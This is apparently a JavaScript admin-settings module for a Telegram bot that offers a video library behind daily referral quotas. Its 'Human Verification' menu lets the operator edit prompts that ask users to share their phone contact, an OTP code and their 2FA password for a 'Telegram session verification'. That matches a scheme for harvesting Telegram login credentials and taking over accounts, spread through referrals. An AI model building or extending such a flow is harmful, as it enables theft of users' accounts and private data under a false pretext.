const { InlineKeyboard } = require('grammy');
const settingsRepo = require('../../db/settings');
const logsRepo = require('../../db/logs');
const referralsRepo = require('../../db/referrals');
const session = require('../../utils/session');
const { humanVerifySettingsKeyboard } = require('../../keyboards/keyboards');

async function showSettingsMenu(ctx) {
  const settings = await settingsRepo.getAllSettings();
  const timer = settings.content_auto_delete_minutes || '0';
  const hvEnabled = settings.human_verify_enabled === 'true';
  const kb = new InlineKeyboard();
  kb.text(`🌐 Bot Language`, 'asettings:language').row();
  kb.text(`⏱️ Auto-Delete Timer: ${timer === '0' ? 'Off' : timer + ' min'}`, 'asettings:autodelete').row();
  kb.text(
    `🔗 Daily Referrals: ${
      settings.referral_requirement_enabled === 'true'
        ? `${settings.referral_daily_requirement}/day`
        : 'Off'
    }`,
    'admin:referrals'
  ).row();
  kb.text(`🔐 Human Verification: ${hvEnabled ? 'On' : 'Off'}`, 'asettings:hv').row();
  kb.text('📋 View All Settings', 'asettings:view').row();
  kb.text('⬅️ Back', 'admin:panel');
  await ctx.editMessageText(
    '⚙️ Bot Settings\n\nConfigure general bot behavior.\n\n' +
      `Auto-Delete Timer: ${timer === '0' ? 'Off (content stays forever)' : timer + ' minutes after sending'}`,
    { reply_markup: kb }
  );
}

async function showHumanVerifyMenu(ctx) {
  const settings = await settingsRepo.getAllSettings();
  const enabled = settings.human_verify_enabled === 'true';
  const kb = humanVerifySettingsKeyboard(settings);
  const text =
    '🔐 Human Verification\n\n' +
    `Status: ${enabled ? 'Enabled ✅' : 'Disabled ⛔'}\n\n` +
    'When enabled, users must complete a one-time Telegram session verification ' +
    'before they can access the video library.\n\n' +
    'You can customize every prompt shown to users:\n' +
    `• Prompt: "${truncate(settings.human_verify_prompt, 50)}"\n` +
    `• Contact button: "${truncate(settings.share_contact_button_text, 30)}"\n` +
    `• OTP prompt: "${truncate(settings.otp_prompt_text, 40)}"\n` +
    `• Success message: "${truncate(settings.human_verified_message, 40)}"\n` +
    `• 2FA prompt: "${truncate(settings.twofa_prompt_text, 50)}"`;
  await ctx.editMessageText(text, { reply_markup: kb });
  await ctx.answerCallbackQuery();
}

async function toggleHumanVerify(ctx) {
  const settings = await settingsRepo.getAllSettings();
  const now = settings.human_verify_enabled === 'true' ? 'false' : 'true';
  await settingsRepo.setSetting('human_verify_enabled', now, ctx.from.id);
  await logsRepo.logAction({
    adminId: ctx.from.id,
    action: 'toggle_human_verify',
    target: now,
  });
  await ctx.answerCallbackQuery(now === 'true' ? 'Human verification enabled.' : 'Human verification disabled.');
  await showHumanVerifyMenu(ctx);
}

async function startHumanVerifyEdit(ctx, key) {
  const allowed = [
    'human_verify_prompt',
    'share_contact_button_text',
    'otp_prompt_text',
    'human_verified_message',
    'twofa_prompt_text',
  ];
  if (!allowed.includes(key)) {
    return ctx.answerCallbackQuery({ text: 'Unknown field.', show_alert: true });
  }

  const settings = await settingsRepo.getAllSettings();
  session.set(ctx.from.id, { flow: 'settings_hv_edit', hvKey: key });

  const labels = {
    human_verify_prompt: 'Verification Prompt',
    share_contact_button_text: 'Share-Contact Button Text',
    otp_prompt_text: 'OTP Prompt',
    human_verified_message: 'Success Message',
    twofa_prompt_text: '2FA Prompt',
  };

  await ctx.reply(
    `✏️ Editing: ${labels[key]}\n\n` +
      `Current value:\n<code>${escapeHtml(settings[key] || '')}</code>\n\n` +
      `Send the new value in chat.\n` +
      `HTML tags like &lt;b&gt;bold&lt;/b&gt; and &lt;code&gt;mono&lt;/code&gt; are supported.\n\n` +
      `Send /cancel to abort.`,
    { parse_mode: 'HTML' }
  );
  await ctx.answerCallbackQuery();
}

async function showReferralMenu(ctx) {
  const [settings, stats] = await Promise.all([
    settingsRepo.getAllSettings(),
    referralsRepo.getStats(),
  ]);
  const enabled = settings.referral_requirement_enabled === 'true';
  const required = Number(settings.referral_daily_requirement) || 0;
  const kb = new InlineKeyboard();
  kb.text('✏️ Set Daily Requirement', 'asettings:referrals').row();
  kb.text('🕒 Set Referral Timezone', 'asettings:referral_timezone').row();
  if (enabled) kb.text('⛔ Disable Referral Program', 'asettings:referrals_off').row();
  kb.text('⬅️ Back to Settings', 'admin:settings').row();
  kb.text('⬅️ Back to Admin Panel', 'admin:panel').row();

  const status = enabled ? `Enabled — ${required} valid referral(s) per day` : 'Disabled';
  const text =
    '🔗 Referral Program\n\n' +
    `Status: ${status}\n` +
    `Timezone: ${settings.referral_timezone}\n\n` +
    `Total referrals: ${stats.total}\n` +
    `Valid referrals: ${stats.valid}\n` +
    `Pending referrals: ${stats.pending}\n\n` +
    'A referral becomes valid after the referred user completes join verification.';
  await ctx.editMessageText(text, { reply_markup: kb });
  await ctx.answerCallbackQuery();
}

async function startLanguage(ctx) {
  session.set(ctx.from.id, { flow: 'settings_language' });
  await ctx.reply('🌐 Send the bot language code (e.g., en, ru, uz):');
  await ctx.answerCallbackQuery();
}

async function startAutoDelete(ctx) {
  session.set(ctx.from.id, { flow: 'settings_autodelete' });
  await ctx.reply(
    '⏱️ Auto-Delete Timer\n\n' +
      "Send the number of minutes after which content should auto-delete from the user's chat.\n\n" +
      'Send 0 to disable auto-delete (content stays forever).\n\n' +
      'Note: Content is also protected from forwarding — users cannot forward or save it.'
  );
  await ctx.answerCallbackQuery();
}

async function startReferrals(ctx) {
  session.set(ctx.from.id, { flow: 'settings_referrals' });
  await ctx.reply(
    '🔗 Referral Requirement\n\n' +
      'Send: ON <number> to require that many valid referrals per day, or OFF to disable.\n' +
      'Example: ON 2\n\n' +
      'A valid referral is a unique user who starts through the link and completes the configured join verification.'
  );
  await ctx.answerCallbackQuery();
}

async function startReferralTimezone(ctx) {
  session.set(ctx.from.id, { flow: 'settings_referral_timezone' });
  await ctx.reply(
    '🕒 Referral Timezone\n\n' +
      'Send an IANA timezone, for example:\n' +
      'Asia/Calcutta\n' +
      'Asia/Kolkata\n' +
      'UTC\n\n' +
      'Daily referral progress resets according to this timezone.'
  );
  await ctx.answerCallbackQuery();
}

async function disableReferrals(ctx) {
  await settingsRepo.setSetting('referral_requirement_enabled', 'false', ctx.from.id);
  await settingsRepo.setSetting('referral_daily_requirement', '0', ctx.from.id);
  await logsRepo.logAction({
    adminId: ctx.from.id,
    action: 'disable_referral_requirement',
    target: 'referral_program',
  });
  await ctx.answerCallbackQuery('Referral program disabled.');
  await showReferralMenu(ctx);
}

async function handleTextInput(ctx) {
  const s = session.get(ctx.from.id);
  if (!s || !s.flow) return false;

  if (s.flow === 'settings_language') {
    const lang = ctx.message.text.trim().toLowerCase().slice(0, 5);
    await settingsRepo.setSetting('bot_language', lang, ctx.from.id);
    await logsRepo.logAction({ adminId: ctx.from.id, action: 'set_language', target: lang });
    session.clear(ctx.from.id);
    await ctx.reply(`✅ Language set to ${lang}.`);
    return true;
  }

  if (s.flow === 'settings_autodelete') {
    const minutes = parseInt(ctx.message.text.trim(), 10);
    if (Number.isNaN(minutes) || minutes < 0) {
      await ctx.reply('⚠️ Please send a valid number (0 or more). 0 = disabled.');
      return true;
    }
    await settingsRepo.setSetting('content_auto_delete_minutes', String(minutes), ctx.from.id);
    await logsRepo.logAction({ adminId: ctx.from.id, action: 'set_autodelete', target: String(minutes) });
    session.clear(ctx.from.id);
    await ctx.reply(
      minutes === 0
        ? '✅ Auto-delete disabled. Content will stay forever.'
        : `✅ Content will auto-delete after ${minutes} minute(s). Content is also protected from forwarding.`
    );
    return true;
  }

  if (s.flow === 'settings_hv_edit') {
    const key = s.hvKey;
    const value = ctx.message.text;
    if (!key || !value) {
      session.clear(ctx.from.id);
      await ctx.reply('⚠️ Invalid input. Please try again.');
      return true;
    }
    await settingsRepo.setSetting(key, value, ctx.from.id);
    await logsRepo.logAction({ adminId: ctx.from.id, action: 'set_hv_field', target: key });
    session.clear(ctx.from.id);
    await ctx.reply(`✅ Updated <code>${key}</code>.`, { parse_mode: 'HTML' });
    return true;
  }

  if (s.flow === 'settings_referrals') {
    const input = ctx.message.text.trim().toLowerCase();
    if (input === 'off') {
      await settingsRepo.setSetting('referral_requirement_enabled', 'false', ctx.from.id);
      await settingsRepo.setSetting('referral_daily_requirement', '0', ctx.from.id);
      session.clear(ctx.from.id);
      await ctx.reply('✅ Daily referral requirement disabled.');
      return true;
    }
    const match = input.match(/^on\s+(\d+)$/);
    const required = match ? Number(match[1]) : NaN;
    if (!Number.isInteger(required) || required < 1 || required > 1000) {
      await ctx.reply('⚠️ Use ON followed by a number from 1 to 1000, or OFF.');
      return true;
    }
    await settingsRepo.setSetting('referral_requirement_enabled', 'true', ctx.from.id);
    await settingsRepo.setSetting('referral_daily_requirement', String(required), ctx.from.id);
    session.clear(ctx.from.id);
    await logsRepo.logAction({ adminId: ctx.from.id, action: 'set_referral_requirement', target: String(required) });
    await ctx.reply(`✅ Referral requirement enabled: ${required} valid referral(s) per day.`);
    return true;
  }

  if (s.flow === 'settings_referral_timezone') {
    const timezone = ctx.message.text.trim();
    try {
      new Intl.DateTimeFormat('en-CA', { timeZone: timezone }).format();
    } catch {
      await ctx.reply('⚠️ Invalid timezone. Use a valid IANA timezone such as Asia/Kolkata or UTC.');
      return true;
    }
    await settingsRepo.setSetting('referral_timezone', timezone, ctx.from.id);
    await logsRepo.logAction({ adminId: ctx.from.id, action: 'set_referral_timezone', target: timezone });
    session.clear(ctx.from.id);
    await ctx.reply(`✅ Referral timezone set to ${timezone}.`);
    return true;
  }

  return false;
}

async function viewAll(ctx) {
  const settings = await settingsRepo.getAllSettings();
  let text = '📋 All Settings\n\n';
  for (const [key, value] of Object.entries(settings)) {
    text += `${key}: ${truncate(String(value), 60)}\n`;
  }
  const kb = new InlineKeyboard().text('⬅️ Back', 'admin:settings');
  await ctx.editMessageText(text, { reply_markup: kb });
  await ctx.answerCallbackQuery();
}

function truncate(s, n) {
  return s.length > n ? s.slice(0, n - 1) + '…' : s;
}

function escapeHtml(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

module.exports = {
  showSettingsMenu,
  showHumanVerifyMenu,
  toggleHumanVerify,
  startHumanVerifyEdit,
  showReferralMenu,
  startLanguage,
  startAutoDelete,
  startReferrals,
  startReferralTimezone,
  disableReferrals,
  handleTextInput,
  viewAll,
};